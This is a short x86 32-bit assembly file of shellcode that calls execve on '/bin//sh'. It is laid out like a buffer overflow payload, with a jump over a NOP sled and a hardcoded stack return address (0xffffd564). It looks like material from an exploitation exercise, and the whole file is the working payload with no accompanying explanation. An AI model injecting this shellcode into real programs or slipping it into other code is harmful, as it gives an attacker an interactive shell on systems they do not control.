BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; make sure eax is zeroed again
  cdq
  mov al, 11        ; syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  jmp short 0x1c
  ;db 'yinesiktimX'
  times 8 db 0x90
  dd 0xffffd564
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push edx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])

